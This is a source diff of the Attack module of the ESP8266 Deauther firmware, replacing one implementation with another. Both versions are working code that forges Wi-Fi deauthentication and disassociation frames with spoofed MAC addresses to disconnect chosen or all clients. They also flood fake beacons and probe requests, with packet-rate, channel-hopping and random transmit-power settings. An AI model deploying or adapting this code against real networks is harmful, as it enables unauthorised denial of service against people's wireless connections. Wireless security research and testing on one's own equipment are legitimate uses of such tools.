@@ -1,420 +1,473 @@
+/* This software is licensed under the MIT License: https://github.com/spacehuhntech/esp8266_deauther */
+
 #include "Attack.h"
 
+#include "settings.h"
+
 Attack::Attack() {
-  randomSeed(os_random());
-}
+    getRandomMac(mac);
 
-void Attack::generate() {
-  if (debug) Serial.print("\n generating Macs...");
-
-  Mac _randomBeaconMac;
-  uint8_t _randomMacBuffer[6];
-  beaconAdrs._clear();
-
-  for (int i = 0; i < macListLen; i++) channels[i] = random(1, maxChannel);
-  do {
-    getRandomVendorMac(_randomMacBuffer);
-    for (int i = 0; i < 6; i++) _randomBeaconMac.setAt(_randomMacBuffer[i], i);
-  } while (beaconAdrs.add(_randomBeaconMac) >= 0);
-  if (debug) Serial.println("done");
-}
-
-void Attack::buildDeauth(Mac _ap, Mac _client, uint8_t type, uint8_t reason) {
-  packetSize = 0;
-  for (int i = 0; i < sizeof(deauthPacket); i++) {
-    packet[i] = deauthPacket[i];
-    packetSize++;
-  }
-
-  for (int i = 0; i < 6; i++) {
-    //set target (client)
-    packet[4 + i] = _client._get(i);
-    //set source (AP)
-    packet[10 + i] = packet[16 + i] = _ap._get(i);
-  }
-
-  //set type
-  packet[0] = type;
-  packet[24] = reason;
-}
-
-void Attack::buildBeacon(Mac _ap, String _ssid, int _ch, bool encrypt) {
-  packetSize = 0;
-  int ssidLen = _ssid.length();
-  if (ssidLen > 32) ssidLen = 32;
-
-  for (int i = 0; i < sizeof(beaconPacket_header); i++) {
-    packet[i] = beaconPacket_header[i];
-    packetSize++;
-  }
-
-  for (int i = 0; i < 6; i++) {
-    //set source (AP)
-    packet[10 + i] = packet[16 + i] = _ap._get(i);
-  }
-
-  packet[packetSize] = 0x00;
-  packetSize++;
-  packet[packetSize] = ssidLen;
-  packetSize++;
-
-  for (int i = 0; i < ssidLen; i++) {
-    packet[packetSize] = _ssid[i];
-    packetSize++;
-  }
-
-  for (int i = 0; i < sizeof(beaconPacket_end); i++) {
-    packet[packetSize] = beaconPacket_end[i];
-    packetSize++;
-  }
-
-  packet[packetSize] = _ch;
-  packetSize++;
-
-  if (encrypt) {
-    for (int i = 0; i < sizeof(beaconWPA2tag); i++) {
-      packet[packetSize] = beaconWPA2tag[i];
-      packetSize++;
+    if (settings::getAttackSettings().beacon_interval == INTERVAL_1S) {
+        // 1s beacon interval
+        beaconPacket[32] = 0xe8;
+        beaconPacket[33] = 0x03;
+    } else {
+        // 100ms beacon interval
+        beaconPacket[32] = 0x64;
+        beaconPacket[33] = 0x00;
     }
-  }
 
+    deauth.time = currentTime;
+    beacon.time = currentTime;
+    probe.time  = currentTime;
 }
 
-void Attack::buildProbe(String _ssid, Mac _mac) {
-  int len = _ssid.length();
-  if (len > 32) len = 32;
-  packetSize = 0;
-
-  for (int i = 0; i < sizeof(probePacket); i++) packet[packetSize + i] = probePacket[i];
-  packetSize += sizeof(probePacket);
-
-  for (int i = 0; i < 6; i++) packet[10 + i] = _mac._get(i);
-
-  packet[packetSize] = len;
-  packetSize++;
-
-  for (int i = 0; i < len; i++) packet[packetSize + i] = _ssid[i];
-  packetSize += len;
-
+void Attack::start() {
+    stop();
+    prntln(A_START);
+    attackTime      = currentTime;
+    attackStartTime = currentTime;
+    accesspoints.sortAfterChannel();
+    stations.sortAfterChannel();
+    running = true;
 }
 
-bool Attack::send() {
-  if (wifi_send_pkt_freedom(packet, packetSize, 0) == -1) {
-    /*
-      if(debug){
-      Serial.print(packetSize);
-      Serial.print(" : ");
-      PrintHex8(packet, packetSize);
-      Serial.println("");
-      }
-    */
+void Attack::start(bool beacon, bool deauth, bool deauthAll, bool probe, bool output, uint32_t timeout) {
+    Attack::beacon.active = beacon;
+    Attack::deauth.active = deauth || deauthAll;
+    Attack::deauthAll     = deauthAll;
+    Attack::probe.active  = probe;
+
+    Attack::output  = output;
+    Attack::timeout = timeout;
+
+    // if (((beacon || probe) && ssids.count() > 0) || (deauthAll && scan.countAll() > 0) || (deauth &&
+    // scan.countSelected() > 0)){
+    if (beacon || probe || deauthAll || deauth) {
+        start();
+    } else {
+        prntln(A_NO_MODE_ERROR);
+        accesspoints.sort();
+        stations.sort();
+        stop();
+    }
+}
+
+void Attack::stop() {
+    if (running) {
+        running              = false;
+        deauthPkts           = 0;
+        beaconPkts           = 0;
+        probePkts            = 0;
+        deauth.packetCounter = 0;
+        beacon.packetCounter = 0;
+        probe.packetCounter  = 0;
+        deauth.maxPkts       = 0;
+        beacon.maxPkts       = 0;
+        probe.maxPkts        = 0;
+        packetRate           = 0;
+        deauth.tc            = 0;
+        beacon.tc            = 0;
+        probe.tc             = 0;
+        deauth.active        = false;
+        beacon.active        = false;
+        probe.active         = false;
+        prntln(A_STOP);
+    }
+}
+
+bool Attack::isRunning() {
+    return running;
+}
+
+void Attack::updateCounter() {
+    // stop when timeout is active and time is up
+    if ((timeout > 0) && (currentTime - attackStartTime >= timeout)) {
+        prntln(A_TIMEOUT);
+        stop();
+        return;
+    }
+
+    // deauth packets per second
+    if (deauth.active) {
+        if (deauthAll) deauth.maxPkts = settings::getAttackSettings().deauths_per_target *
+                                        (accesspoints.count() + stations.count() * 2 - names.selected());
+        else deauth.maxPkts = settings::getAttackSettings().deauths_per_target *
+                              (accesspoints.selected() + stations.selected() * 2 + names.selected() + names.stations());
+    } else {
+        deauth.maxPkts = 0;
+    }
+
+    // beacon packets per second
+    if (beacon.active) {
+        beacon.maxPkts = ssids.count();
+
+        if (settings::getAttackSettings().beacon_interval == INTERVAL_100MS) beacon.maxPkts *= 10;
+    } else {
+        beacon.maxPkts = 0;
+    }
+
+    // probe packets per second
+    if (probe.active) probe.maxPkts = ssids.count() * settings::getAttackSettings().probe_frames_per_ssid;
+    else probe.maxPkts = 0;
+
+    // random transmission power
+    if (settings::getAttackSettings().random_tx && (beacon.active || probe.active)) setOutputPower(random(21));
+    else setOutputPower(20.5f);
+
+    // reset counters
+    deauthPkts           = deauth.packetCounter;
+    beaconPkts           = beacon.packetCounter;
+    probePkts            = probe.packetCounter;
+    packetRate           = tmpPacketRate;
+    deauth.packetCounter = 0;
+    beacon.packetCounter = 0;
+    probe.packetCounter  = 0;
+    deauth.tc            = 0;
+    beacon.tc            = 0;
+    probe.tc             = 0;
+    tmpPacketRate        = 0;
+}
+
+void Attack::status() {
+    char s[120];
+
+    sprintf(s, str(
+                A_STATUS).c_str(), packetRate, deauthPkts, deauth.maxPkts, beaconPkts, beacon.maxPkts, probePkts,
+            probe.maxPkts);
+    prnt(String(s));
+}
+
+String Attack::getStatusJSON() {
+    String json = String(OPEN_BRACKET);                                                                          // [
+
+    json += String(OPEN_BRACKET) + b2s(deauth.active) + String(COMMA) + String(scan.countSelected()) + String(COMMA) +
+            String(deauthPkts) + String(COMMA) + String(deauth.maxPkts) + String(CLOSE_BRACKET) + String(COMMA); // [false,0,0,0],
+    json += String(OPEN_BRACKET) + b2s(beacon.active) + String(COMMA) + String(ssids.count()) + String(COMMA) + String(
+        beaconPkts) + String(COMMA) + String(beacon.maxPkts) + String(CLOSE_BRACKET) + String(COMMA);            // [false,0,0,0],
+    json += String(OPEN_BRACKET) + b2s(probe.active) + String(COMMA) + String(ssids.count()) + String(COMMA) + String(
+        probePkts) + String(COMMA) + String(probe.maxPkts) + String(CLOSE_BRACKET) + String(COMMA);              // [false,0,0,0],
+    json += String(packetRate);                                                                                  // 0
+    json += CLOSE_BRACKET;                                                                                       // ]
+
+    return json;
+}
+
+void Attack::update() {
+    if (!running || scan.isScanning()) return;
+
+    apCount = accesspoints.count();
+    stCount = stations.count();
+    nCount  = names.count();
+
+    // run/update all attacks
+    deauthUpdate();
+    deauthAllUpdate();
+    beaconUpdate();
+    probeUpdate();
+
+    // each second
+    if (currentTime - attackTime > 1000) {
+        attackTime = currentTime; // update time
+        updateCounter();
+
+        if (output) status();     // status update
+        getRandomMac(mac);        // generate new random mac
+    }
+}
+
+void Attack::deauthUpdate() {
+    if (!deauthAll && deauth.active && (deauth.maxPkts > 0) && (deauth.packetCounter < deauth.maxPkts)) {
+        if (deauth.time <= currentTime - (1000 / deauth.maxPkts)) {
+            // APs
+            if ((apCount > 0) && (deauth.tc < apCount)) {
+                if (accesspoints.getSelected(deauth.tc)) {
+                    deauth.tc += deauthAP(deauth.tc);
+                } else deauth.tc++;
+            }
+
+            // Stations
+            else if ((stCount > 0) && (deauth.tc >= apCount) && (deauth.tc < stCount + apCount)) {
+                if (stations.getSelected(deauth.tc - apCount)) {
+                    deauth.tc += deauthStation(deauth.tc - apCount);
+                } else deauth.tc++;
+            }
+
+            // Names
+            else if ((nCount > 0) && (deauth.tc >= apCount + stCount) && (deauth.tc < nCount + stCount + apCount)) {
+                if (names.getSelected(deauth.tc - stCount - apCount)) {
+                    deauth.tc += deauthName(deauth.tc - stCount - apCount);
+                } else deauth.tc++;
+            }
+
+            // reset counter
+            if (deauth.tc >= nCount + stCount + apCount) deauth.tc = 0;
+        }
+    }
+}
+
+void Attack::deauthAllUpdate() {
+    if (deauthAll && deauth.active && (deauth.maxPkts > 0) && (deauth.packetCounter < deauth.maxPkts)) {
+        if (deauth.time <= currentTime - (1000 / deauth.maxPkts)) {
+            // APs
+            if ((apCount > 0) && (deauth.tc < apCount)) {
+                tmpID = names.findID(accesspoints.getMac(deauth.tc));
+
+                if (tmpID < 0) {
+                    deauth.tc += deauthAP(deauth.tc);
+                } else if (!names.getSelected(tmpID)) {
+                    deauth.tc += deauthAP(deauth.tc);
+                } else deauth.tc++;
+            }
+
+            // Stations
+            else if ((stCount > 0) && (deauth.tc >= apCount) && (deauth.tc < stCount + apCount)) {
+                tmpID = names.findID(stations.getMac(deauth.tc - apCount));
+
+                if (tmpID < 0) {
+                    deauth.tc += deauthStation(deauth.tc - apCount);
+                } else if (!names.getSelected(tmpID)) {
+                    deauth.tc += deauthStation(deauth.tc - apCount);
+                } else deauth.tc++;
+            }
+
+            // Names
+            else if ((nCount > 0) && (deauth.tc >= apCount + stCount) && (deauth.tc < apCount + stCount + nCount)) {
+                if (!names.getSelected(deauth.tc - apCount - stCount)) {
+                    deauth.tc += deauthName(deauth.tc - apCount - stCount);
+                } else deauth.tc++;
+            }
+
+            // reset counter
+            if (deauth.tc >= nCount + stCount + apCount) deauth.tc = 0;
+        }
+    }
+}
+
+void Attack::probeUpdate() {
+    if (probe.active && (probe.maxPkts > 0) && (probe.packetCounter < probe.maxPkts)) {
+        if (probe.time <= currentTime - (1000 / probe.maxPkts)) {
+            if (settings::getAttackSettings().attack_all_ch) setWifiChannel(probe.tc % 11, true);
+            probe.tc += sendProbe(probe.tc);
+
+            if (probe.tc >= ssids.count()) probe.tc = 0;
+        }
+    }
+}
+
+void Attack::beaconUpdate() {
+    if (beacon.active && (beacon.maxPkts > 0) && (beacon.packetCounter < beacon.maxPkts)) {
+        if (beacon.time <= currentTime - (1000 / beacon.maxPkts)) {
+            beacon.tc += sendBeacon(beacon.tc);
+
+            if (beacon.tc >= ssids.count()) beacon.tc = 0;
+        }
+    }
+}
+
+bool Attack::deauthStation(int num) {
+    return deauthDevice(stations.getAPMac(num), stations.getMac(num), settings::getAttackSettings().deauth_reason, stations.getCh(num));
+}
+
+bool Attack::deauthAP(int num) {
+    return deauthDevice(accesspoints.getMac(num), broadcast, settings::getAttackSettings().deauth_reason, accesspoints.getCh(num));
+}
+
+bool Attack::deauthName(int num) {
+    if (names.isStation(num)) {
+        return deauthDevice(names.getBssid(num), names.getMac(num), settings::getAttackSettings().deauth_reason, names.getCh(num));
+    } else {
+        return deauthDevice(names.getMac(num), broadcast, settings::getAttackSettings().deauth_reason, names.getCh(num));
+    }
+}
+
+bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_t ch) {
+    if (!stMac) return false;  // exit when station mac is null
+
+    // Serial.println("Deauthing "+macToStr(apMac)+" -> "+macToStr(stMac)); // for debugging
+
+    bool success = false;
+
+    // build deauth packet
+    packetSize = sizeof(deauthPacket);
+
+    uint8_t deauthpkt[packetSize];
+
+    memcpy(deauthpkt, deauthPacket, packetSize);
+
+    memcpy(&deauthpkt[4], stMac, 6);
+    memcpy(&deauthpkt[10], apMac, 6);
+    memcpy(&deauthpkt[16], apMac, 6);
+    deauthpkt[24] = reason;
+
+    // send deauth frame
+    deauthpkt[0] = 0xc0;
+
+    if (sendPacket(deauthpkt, packetSize, ch, true)) {
+        success = true;
+        deauth.packetCounter++;
+    }
+
+    // send disassociate frame
+    uint8_t disassocpkt[packetSize];
+
+    memcpy(disassocpkt, deauthpkt, packetSize);
+
+    disassocpkt[0] = 0xa0;
+
+    if (sendPacket(disassocpkt, packetSize, ch, false)) {
+        success = true;
+        deauth.packetCounter++;
+    }
+
+    // send another packet, this time from the station to the accesspoint
+    if (!macBroadcast(stMac)) { // but only if the packet isn't a broadcast
+        // build deauth packet
+        memcpy(&disassocpkt[4], apMac, 6);
+        memcpy(&disassocpkt[10], stMac, 6);
+        memcpy(&disassocpkt[16], stMac, 6);
+
+        // send deauth frame
+        disassocpkt[0] = 0xc0;
+
+        if (sendPacket(disassocpkt, packetSize, ch, false)) {
+            success = true;
+            deauth.packetCounter++;
+        }
+
+        // send disassociate frame
+        disassocpkt[0] = 0xa0;
+
+        if (sendPacket(disassocpkt, packetSize, ch, false)) {
+            success = true;
+            deauth.packetCounter++;
+        }
+    }
+
+    if (success) deauth.time = currentTime;
+
+    return success;
+}
+
+bool Attack::sendBeacon(uint8_t tc) {
+    if (settings::getAttackSettings().attack_all_ch) setWifiChannel(tc % 11, true);
+    mac[5] = tc;
+    return sendBeacon(mac, ssids.getName(tc).c_str(), wifi_channel, ssids.getWPA2(tc));
+}
+
+bool Attack::sendBeacon(uint8_t* mac, const char* ssid, uint8_t ch, bool wpa2) {
+    packetSize = sizeof(beaconPacket);
+
+    if (wpa2) {
+        beaconPacket[34] = 0x31;
+    } else {
+        beaconPacket[34] = 0x21;
+        packetSize      -= 26;
+    }
+
+    int ssidLen = strlen(ssid);
+
+    if (ssidLen > 32) ssidLen = 32;
+
+    memcpy(&beaconPacket[10], mac, 6);
+    memcpy(&beaconPacket[16], mac, 6);
+    memcpy(&beaconPacket[38], ssid, ssidLen);
+
+    beaconPacket[82] = ch;
+
+    // =====
+    uint16_t tmpPacketSize = (packetSize - 32) + ssidLen;                // calc size
+    uint8_t* tmpPacket     = new uint8_t[tmpPacketSize];                 // create packet buffer
+
+    memcpy(&tmpPacket[0], &beaconPacket[0], 38 + ssidLen);               // copy first half of packet into buffer
+    tmpPacket[37] = ssidLen;                                             // update SSID length byte
+    memcpy(&tmpPacket[38 + ssidLen], &beaconPacket[70], wpa2 ? 39 : 13); // copy second half of packet into buffer
+
+    bool success = sendPacket(tmpPacket, tmpPacketSize, ch, false);
+
+    if (success) {
+        beacon.time = currentTime;
+        beacon.packetCounter++;
+    }
+
+    delete[] tmpPacket; // free memory of allocated buffer
+
+    return success;
+    // =====
+}
+
+bool Attack::sendProbe(uint8_t tc) {
+    if (settings::getAttackSettings().attack_all_ch) setWifiChannel(tc % 11, true);
+    mac[5] = tc;
+    return sendProbe(mac, ssids.getName(tc).c_str(), wifi_channel);
+}
+
+bool Attack::sendProbe(uint8_t* mac, const char* ssid, uint8_t ch) {
+    packetSize = sizeof(probePacket);
+    int ssidLen = strlen(ssid);
+
+    if (ssidLen > 32) ssidLen = 32;
+
+    memcpy(&probePacket[10], mac, 6);
+    memcpy(&probePacket[26], ssid, ssidLen);
+
+    if (sendPacket(probePacket, packetSize, ch, false)) {
+        probe.time = currentTime;
+        probe.packetCounter++;
+        return true;
+    }
+
     return false;
-  }
-  delay(1); //less packets are beeing dropped
-  return true;
 }
 
-void Attack::run() {
-  unsigned long currentMillis = millis();
+bool Attack::sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t ch, bool force_ch) {
+    // Serial.println(bytesToStr(packet, packetSize));
 
-  /* =============== Deauth Attack =============== */
-  if (isRunning[0] && currentMillis - prevTime[0] >= 1000) {
-    if (debug) Serial.print("running " + (String)attackNames[0] + " attack...");
-    prevTime[0] = millis();
+    // set channel
+    setWifiChannel(ch, force_ch);
 
-    for (int a = 0; a < apScan.results; a++) {
-      if (apScan.isSelected(a)) {
-        Mac _ap;
-        int _ch = apScan.getAPChannel(a);
-        _ap.setMac(apScan.aps._get(a));
+    // sent out packet
+    bool sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;
 
-        wifi_set_channel(_ch);
+    if (sent) ++tmpPacketRate;
 
-        int _selectedClients = 0;
-        for (int i = 0; i < clientScan.results; i++) {
-          if (clientScan.getClientSelected(i)) {
-            _selectedClients++;
-
-            if (settings.channelHop) {
-              for (int j = 1; j < maxChannel; j++) {
-                wifi_set_channel(j);
-
-                buildDeauth(_ap, clientScan.getClientMac(i), 0xc0, settings.deauthReason );
-                if (send()) packetsCounter[0]++;
-
-                buildDeauth(_ap, clientScan.getClientMac(i), 0xa0, settings.deauthReason );
-                if (send()) packetsCounter[0]++;
-              }
-            } else {
-              buildDeauth(_ap, clientScan.getClientMac(i), 0xc0, settings.deauthReason );
-              for (int h = 0; h < settings.attackPacketRate; h++) {
-                if (send()) {
-                  packetsCounter[0]++;
-                  delay((950 / (settings.attackPacketRate * clientScan.selectedResults)) / 2 - 1);
-                }
-              }
-
-              buildDeauth(_ap, clientScan.getClientMac(i), 0xa0, settings.deauthReason );
-              for (int h = 0; h < settings.attackPacketRate; h++) {
-                if (send()) {
-                  packetsCounter[0]++;
-                  delay((950 / (settings.attackPacketRate * clientScan.selectedResults)) / 2 - 1);
-                }
-              }
-            }
-          }
-        }
-
-        if (_selectedClients == 0) {
-          Mac _client;
-          _client.set(0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF);
-
-          if (settings.channelHop) {
-            for (int j = 1; j < maxChannel; j++) {
-              wifi_set_channel(j);
-
-              buildDeauth(_ap, _client, 0xc0, settings.deauthReason );
-              if (send()) packetsCounter[0]++;
-
-              buildDeauth(_ap, _client, 0xa0, settings.deauthReason );
-              if (send()) packetsCounter[0]++;
-            }
-          } else {
-            buildDeauth(_ap, _client, 0xc0, settings.deauthReason );
-            for (int h = 0; h < settings.attackPacketRate; h++) if (send()) packetsCounter[0]++;
-
-            buildDeauth(_ap, _client, 0xa0, settings.deauthReason );
-            for (int h = 0; h < settings.attackPacketRate; h++) if (send()) packetsCounter[0]++;
-          }
-        }
-
-      }
-    }
-
-    stati[0] = (String)packetsCounter[0] + "pkts/s";
-    packetsCounter[0] = 0;
-    if (debug) Serial.println(" done");
-    if (settings.attackTimeout > 0) {
-      attackTimeoutCounter[0]++;
-      if (attackTimeoutCounter[0] > settings.attackTimeout) stop(0);
-    }
-  }
-
-  /* =============== Beacon clone Attack =============== */
-  if (isRunning[1] && currentMillis - prevTime[1] >= 100) {
-    if (debug) Serial.print("running " + (String)attackNames[1] + " attack...");
-    prevTime[1] = millis();
-
-    for (int a = 0; a < apScan.results; a++) {
-      if (apScan.isSelected(a) && !apScan.isHidden(a)) {
-        String _ssid = apScan.getAPName(a);
-        int _ssidLen = _ssid.length();
-        int _restSSIDLen = 32 - _ssidLen;
-        //int _ch = apScan.getAPChannel(a);
-
-        //wifi_set_channel(_ch);
-
-        for (int c = 0; c < macListLen / apScan.selectedSum; c++) {
-          String _apName = _ssid;
-          int _ch = channels[c];
-
-          if (c < _restSSIDLen) for (int d = 0; d < _restSSIDLen - c; d++) _apName += " "; //e.g. "SAMPLEAP   "
-          else if (c < _restSSIDLen * 2) {
-            _apName = " " + _apName;
-            for (int d = 0; d < (_restSSIDLen - 1) - c / 2; d++) _apName += " "; //e.g. " SAMPLEAP   "
-          } else if (c < _restSSIDLen * 3) {
-            _apName = "." + _apName;
-            for (int d = 0; d < (_restSSIDLen - 1) - c / 3; d++) _apName += " "; //e.g. ".SAMPLEAP   "
-          } else {
-            for (int d = 0; d < _restSSIDLen - 2; d++) _apName += " ";
-            _apName += (String)c;//e.g. "SAMPLEAP        78"
-          }
-
-          buildBeacon(beaconAdrs._get(c), _apName, _ch, apScan.getAPEncryption(a) != "none");
-
-          if (send()) packetsCounter[1]++;
-        }
-
-      }
-    }
-
-    stati[1] = (String)(packetsCounter[1] * 10) + "pkts/s";
-    packetsCounter[1] = 0;
-    macListChangeCounter++;
-    if (macListChangeCounter / 10 >= macChangeInterval && macChangeInterval > 0) {
-      generate();
-      macListChangeCounter = 0;
-    }
-    if (debug) Serial.println(" done");
-    if (settings.attackTimeout > 0) {
-      attackTimeoutCounter[1]++;
-      if (attackTimeoutCounter[1] / 10 > settings.attackTimeout) stop(1);
-    }
-  }
-
-  /* =============== Beacon list Attack =============== */
-  if (isRunning[2] && currentMillis - prevTime[2] >= 100) {
-    if (debug) Serial.print("running " + (String)attackNames[2] + " attack...");
-    prevTime[2] = millis();
-
-    for (int a = 0; a < ssidList.len; a++) {
-      String _ssid = ssidList.get(a);
-      int _ch = channels[a];
-
-      buildBeacon(beaconAdrs._get(a), _ssid, _ch, settings.attackEncrypted);
-
-      if (send()) packetsCounter[2]++;
-    }
-
-    stati[2] = (String)(packetsCounter[2] * 10) + "pkts/s";
-    packetsCounter[2] = 0;
-    macListChangeCounter++;
-    if (macListChangeCounter / 10 >= macChangeInterval && macChangeInterval > 0) {
-      generate();
-      macListChangeCounter = 0;
-    }
-    if (debug) Serial.println(" done");
-    if (settings.attackTimeout > 0) {
-      attackTimeoutCounter[2]++;
-      if (attackTimeoutCounter[2] / 10 > settings.attackTimeout) stop(2);
-    }
-  }
-
-  /* =============== Probe Request Attack =============== */
-  if (isRunning[3] && currentMillis - prevTime[3] >= 1000) {
-    if (debug) Serial.print("running " + (String)attackNames[3] + " attack...");
-    prevTime[3] = millis();
-
-    for (int a = 0; a < ssidList.len; a++) {
-      buildProbe(ssidList.get(a), beaconAdrs._get(a));
-      if (send()) packetsCounter[3]++;
-    }
-
-    stati[3] = (String)(packetsCounter[3] * 10) + "pkts/s";
-    packetsCounter[3] = 0;
-    macListChangeCounter++;
-    if (macListChangeCounter >= macChangeInterval && macChangeInterval > 0) {
-      generate();
-      macListChangeCounter = 0;
-    }
-    if (debug) Serial.println("done");
-    if (settings.attackTimeout > 0) {
-      attackTimeoutCounter[3]++;
-      if (attackTimeoutCounter[3] > settings.attackTimeout) stop(3);
-    }
-  }
-
+    return sent;
 }
 
-void Attack::start(int num) {
-  Serial.println(num);
-  if (!isRunning[num]) {
-    Serial.println(num);
-    isRunning[num] = true;
-    stati[num] = "starting";
-    prevTime[num] = millis();
-    attackTimeoutCounter[num] = 0;
-    refreshLed();
-    if (debug) Serial.println("starting " + (String)attackNames[num] + " attack...");
-    if (num == 0) attackMode = "STOP";
-    if (num == 1) {
-      stop(2);
-      stop(3);
-    } else if (num == 2) {
-      stop(1);
-      stop(3);
-    } else if (num == 3) {
-      stop(1);
-      stop(2);
-    }
-  } else stop(num);
+void Attack::enableOutput() {
+    output = true;
+    prntln(A_ENABLED_OUTPUT);
 }
 
-void Attack::stop(int num) {
-  if (isRunning[num]) {
-    if (debug) Serial.println("stopping " + (String)attackNames[num] + " attack...");
-    if (num == 0) attackMode = "START";
-    isRunning[num] = false;
-    stati[num] = "ready";
-    prevTime[num] = millis();
-    refreshLed();
-  }
+void Attack::disableOutput() {
+    output = false;
+    prntln(A_DISABLED_OUTPUT);
 }
 
-void Attack::stopAll() {
-  for (int i = 0; i < attacksNum; i++) stop(i);
+uint32_t Attack::getDeauthPkts() {
+    return deauthPkts;
 }
 
-String Attack::getResults() {
-  if (debug) Serial.print("getting attacks JSON...");
-
-  for (int i = 0; i < attacksNum; i++) if (!isRunning[i]) stati[i] = "ready";
-
-  if (apScan.getFirstTarget() < 0) stati[0] = stati[1] = "no AP";
-  if (ssidList.len < 1) stati[2] = stati[3] = "no SSID";
-
-  int _selected;
-  String json = "{ \"aps\": [";
-
-  _selected = 0;
-  for (int i = 0; i < apScan.results; i++) {
-    if (apScan.isSelected(i)) {
-      json += "\"" + apScan.getAPName(i) + "\",";
-      _selected++;
-    }
-  }
-  if (_selected > 0) json.remove(json.length() - 1);
-
-  json += "], \"clients\": [";
-
-  _selected = 0;
-  for (int i = 0; i < clientScan.results; i++) {
-    if (clientScan.getClientSelected(i)) {
-      json += "\"" + clientScan.getClientMac(i).toString() + " " + clientScan.getClientVendor(i) + " - " + clientScan.getClientName(i) + "\",";
-      _selected++;
-    }
-  }
-  if (_selected == 0) json += "\"FF:FF:FF:FF:FF:FF - BROADCAST\"";
-  else json.remove(json.length() - 1);
-
-  json += "], \"attacks\": [";
-  for (int i = 0; i < attacksNum; i++) {
-    json += "{";
-    json += "\"name\": \"" + attackNames[i] + "\",";
-    json += "\"status\": \"" + stati[i] + "\",";
-    json += "\"running\": " + (String)isRunning[i] + "";
-    json += "}";
-    if (i != attacksNum - 1) json += ",";
-  }
-  json += "],";
-
-  json += "\"ssid\": [";
-  for (int i = 0; i < ssidList.len; i++) {
-    json += "\"" + ssidList.get(i) + "\"";
-    if (i != ssidList.len - 1) json += ",";
-  }
-  json += "]";
-  json += "}";
-  if (debug) {
-    Serial.println(json);
-    Serial.println("done");
-  }
-  return json;
+uint32_t Attack::getBeaconPkts() {
+    return beaconPkts;
 }
 
-void Attack::refreshLed() {
-  int numberRunning = 0;
-  for (int i = 0; i < sizeof(isRunning); i++) {
-    if (isRunning[i]) numberRunning++;
-    //if(debug) Serial.println(numberRunning);
-  }
-  if (numberRunning >= 1 && settings.useLed) {
-    if (debug) Serial.println("Attack LED : ON");
-    digitalWrite(2, LOW);
-  }
-  else if (numberRunning == 0 || !settings.useLed) {
-    if (debug) Serial.println("Attack LED : OFF");
-    digitalWrite(2, HIGH);
-  }
+uint32_t Attack::getProbePkts() {
+    return probePkts;
 }
 
+uint32_t Attack::getDeauthMaxPkts() {
+    return deauth.maxPkts;
+}
+
+uint32_t Attack::getBeaconMaxPkts() {
+    return beacon.maxPkts;
+}
+
+uint32_t Attack::getProbeMaxPkts() {
+    return probe.maxPkts;
+}
+
+uint32_t Attack::getPacketRate() {
+    return packetRate;
+}
